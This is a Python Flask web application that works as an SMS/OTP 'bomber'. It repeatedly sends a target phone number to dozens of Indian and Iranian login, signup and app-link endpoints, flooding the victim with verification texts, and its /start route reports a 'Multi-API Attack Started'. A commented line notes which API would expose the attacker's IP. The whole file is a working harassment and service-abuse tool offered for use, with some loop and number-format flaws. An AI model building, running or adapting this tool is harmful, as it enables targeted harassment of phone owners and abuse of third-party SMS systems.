import os
import time
import requests
import threading
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)
active_tasks = {}

def send_bomber(mobile):
    count = 1
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Accept": "*/*"
    }

    while active_tasks.get(mobile):
        print(f"--- Bombing Round {count} Started for {mobile} ---")
        
        # 1. JustDial (GET)
        try: session.get(f"https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={mobile}", headers=headers, timeout=5)
        except: pass

        # 2. ConfirmTkt (POST)
        try: session.post("https://securedapi.confirmtkt.com/api/platform/register", json={"mobileNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 3. Allen Solly (POST)
        try: session.post("https://www.allensolly.com/capillarylogin/validateMobileOrEMail", data={"mobileoremail": mobile}, headers=headers, timeout=5)
        except: pass

        # 4. Housing.com (POST)
        try: session.post("https://login.housing.com/api/v2/send-otp", json={"phone": mobile}, headers=headers, timeout=5)
        except: pass

        # 5. Ajio (POST)
        try: session.post("https://login.web.ajio.com/api/auth/signupSendOTP", json={"mobileNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 6. Unacademy (POST)
        try: session.post("https://unacademy.com/api/v1/user/get_app_link/", data={"phone": mobile}, headers=headers, timeout=5)
        except: pass

        # 7. Treebo (POST)
        try: session.post("https://www.treebo.com/api/v2/auth/login/otp/", json={"phone_number": mobile}, headers=headers, timeout=5)
        except: pass

        # 8. PharmEasy (POST)
        try: session.post("https://pharmeasy.in/api/auth/requestOTP", json={"contactNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 9. Dream11 (POST)
        try: session.post("https://api.dream11.com/sendsmslink", json={"mobileNum": mobile}, headers=headers, timeout=5)
        except: pass

        # 10. Cashify (GET)
        try: session.get(f"https://www.cashify.in/api/cu01/v1/app-link?mn={mobile}", headers=headers, timeout=5)
        except: pass

        # 11. KFC (POST)
        try: session.post("https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin", json={"phoneNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 12. Airtel (GET)
        try: session.get(f"https://www.airtel.in/referral-api/core/notify?messageId=map&rtn={mobile}", headers=headers, timeout=5)
        except: pass

        # 13. HappyEasyGo (GET)
        try: session.get(f"https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91{mobile}", headers=headers, timeout=5)
        except: pass

        # 14. Porter (POST)
        try: session.post("https://porter.in/restservice/send_app_link_sms", json={"phone": mobile}, headers=headers, timeout=5)
        except: pass

        # 15. IndiaLends (POST)
        try: session.post("https://indialends.com/internal/a/mobile-verification_v2.ashx", data={"jfsdfu14hkgertd": mobile}, headers=headers, timeout=5)
        except: pass
        apis = [
        {
            "name": "Snapp V1",
            "method": "POST",
            "url": "https://api.snapp.ir/api/v1/sms/link",
            "data": {"phone": mobile},
        },
        {
            "name": "Snapp V2",
            "method": "POST",
            "url": f"https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone={mobile}",
            "data": {"cellphone": mobile},
        },
        {
            "name": "Achareh",
            "method": "POST",
            "url": "https://api.achareh.co/v2/accounts/login/",
            "data": {"phone": f"98{mobile[1:]}"},
        },
        {
            "name": "Zigap",
            "method": "POST",
            "url": "https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp",
            "data": {"phoneNumber": f"+98{mobile[1:]}"},
        },
        {
            "name": "Jabama",
            "method": "POST",
            "url": "https://gw.jabama.com/api/v4/account/send-code",
            "data": {"mobile": mobile},
        },
        {
            "name": "Banimode",
            "method": "POST",
            "url": "https://mobapi.banimode.com/api/v2/auth/request",
            "data": {"phone": mobile},
        },
        {
            "name": "Classino",
            "method": "POST",
            "url": "https://student.classino.com/otp/v1/api/login",
            "data": {"mobile": mobile},
        },
        {
            "name": "Digikala V1",
            "method": "POST",
            "url": "https://api.digikala.com/v1/user/authenticate/",
            "data": {"username": mobile, "otp_call": False},
        },
        {
            "name": "Digikala V2",
            "method": "POST",
            "url": "https://api.digikala.com/v1/user/forgot/check/",
            "data": {"username": mobile},
        },
        {
            "name": "Sms.ir",
            "method": "POST",
            "url": "https://appapi.sms.ir/api/app/auth/sign-up/verification-code",
            "data": mobile,
        },
        {
            "name": "Alibaba",
            "method": "POST",
            "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
            "data": {"phoneNumber": mobile[1:]},
        },
        {
            "name": "Divar",
            "method": "POST",
            "url": "https://api.divar.ir/v5/auth/authenticate",
            "data": {"phone": mobile},
        },
        {
            "name": "Sheypoor",
            "method": "POST",
            "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
            "data": {"username": mobile},
        },
        {
            "name": "Bikoplus",
            "method": "POST",
            "url": "https://bikoplus.com/account/check-phone-number",
            "data": {"phoneNumber": mobile},
        },
        {
            "name": "Mootanroo",
            "method": "POST",
            "url": "https://api.mootanroo.com/api/v3/auth/send-otp",
            "data": {"PhoneNumber": mobile},
        },
        {
            "name": "Tap33",
            "method": "POST",
            "url": "https://tap33.me/api/v2/user",
            "data": {"credential": {"phoneNumber": mobile, "role": "BIKER"}},
        },
        {
            "name": "Tapsi",
            "method": "POST",
            "url": "https://api.tapsi.ir/api/v2.2/user",
            "data": {
                "credential": {"phoneNumber": mobile, "role": "DRIVER"},
                "otpOption": "SMS",
            },
        },
        {
            "name": "GapFilm",
            "method": "POST",
            "url": "https://core.gapfilm.ir/api/v3.1/Account/Login",
            "data": {"Type": "3", "Username": mobile[1:]},
        },
        {
            "name": "IToll",
            "method": "POST",
            "url": "https://app.itoll.com/api/v1/auth/login",
            "data": {"mobile": mobile},
        },
        {
            "name": "Anargift",
            "method": "POST",
            "url": "https://api.anargift.com/api/v1/auth/auth",
            "data": {"mobile_number": mobile},
        },
        {
            "name": "Nobat",
            "method": "POST",
            "url": "https://nobat.ir/api/public/patient/login/phone",
            "data": {"mobile": mobile[1:]},
        },
        {
            "name": "Lendo",
            "method": "POST",
            "url": "https://api.lendo.ir/api/customer/auth/send-otp",
            "data": {"mobile": mobile},
        },
        {
            "name": "Hamrah-Mechanic",
            "method": "POST",
            "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp",
            "data": {"PhoneNumber": mobile},
        },
        {
            "name": "Abantether",
            "method": "POST",
            "url": "https://abantether.com/users/register/phone/send/",
            "data": {"phoneNumber": mobile},
        },
        {
            "name": "OKCS",
            "method": "POST",
            "url": "https://my.okcs.com/api/check-mobile",
            "data": {"mobile": mobile},
        },
        {
            "name": "Tebinja",
            "method": "POST",
            "url": "https://www.tebinja.com/api/v1/users",
            "data": {"username": mobile},
        },
        {
            "name": "Bit24",
            "method": "POST",
            "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
            "data": {"mobile": mobile},
        },
        {
            "name": "Rojashop",
            "method": "POST",
            "url": "https://rojashop.com/api/send-otp-register",
            "data": {"mobile": mobile},
        },
        {
            "name": "Paklean",
            "method": "POST",
            "url": "https://client.api.paklean.com/download",
            "data": {"tel": mobile},
        },
        {
            "name": "Khodro45",
            "method": "POST",
            "url": "https://khodro45.com/api/v1/customers/otp/",
            "data": {"mobile": mobile},
        },
        {
            "name": "Delino",
            "method": "POST",
            "url": "https://www.delino.com/user/register",
            "data": {"mobile": mobile},
        },
        {
            "name": "DigikalaJet",
            "method": "POST",
            "url": "https://api.digikalajet.ir/user/login-register/",
            "data": {"phone": mobile},
        },
        {
            "name": "Miare",
            "method": "POST",
            "url": "https://www.miare.ir/api/otp/driver/request/",
            "data": {"phone_number": mobile},
        },
        {
            "name": "Dosma",
            "method": "POST",
            "url": "https://app.dosma.ir/api/v1/account/send-otp/",
            "data": {"mobile": mobile},
        },
        {
            "name": "Ostadkr",
            "method": "POST",
            "url": "https://api.ostadkr.com/login",
            "data": {"mobile": mobile},
        },
        {
            "name": "Sibbazar",
            "method": "POST",
            "url": "https://sandbox.sibbazar.com/api/v1/user/invite",
            "data": {"username": mobile},
        },
        {
            "name": "Namava",
            "method": "POST",
            "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
            "data": {"UserName": f"+98{mobile[1:]}"},
        },
        {
            "name": "Shab",
            "method": "POST",
            "url": "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/check-mobile",
            "data": {"mobile": mobile},
        },
        {
            "name": "Bitpin",
            "method": "POST",
            "url": "https://api.bitpin.org/v2/usr/signin/",
            "data": {"phone": mobile},
        },
        {
            "name": "Taaghche",
            "method": "POST",
            "url": "https://gw.taaghche.com/v4/site/auth/signup",
            "data": {"contact": mobile},
        },
        # {
        #     "name": "Digipay",
        #     "method": "POST",
        #     "url": "https://www.mydigipay.com/digipay/api/users/send-sms",
        #     "data": {"cellNumber": mobile},
        # }, # This one will send your IP to your target.
    ]
    for api in apis:
        try:
            if api["method"] == "POST":
                session.post(api["url"], json=api["data"])
            elif api["method"] == "GET":
                session.get(api["url"])
        except:
            pass
            
    print(f"Round {count} Finished.")
    count += 1
    time.sleep(1)



@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_bomber():
    mobile = request.form.get('mobile')
    if not mobile or len(mobile) != 10:
        return jsonify({"status": "error", "message": "Invalid 10-digit Number"})
    
    if mobile not in active_tasks or not active_tasks[mobile]:
        active_tasks[mobile] = True
        threading.Thread(target=send_bomber, args=(mobile,)).start()
        return jsonify({"status": "success", "message": f"Multi-API Attack Started on {mobile}"})
    return jsonify({"status": "info", "message": "Already running"})

@app.route('/stop', methods=['POST'])
def stop_bomber():
    mobile = request.form.get('mobile')
    active_tasks[mobile] = False
    return jsonify({"status": "success", "message": "Attack Stopped"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
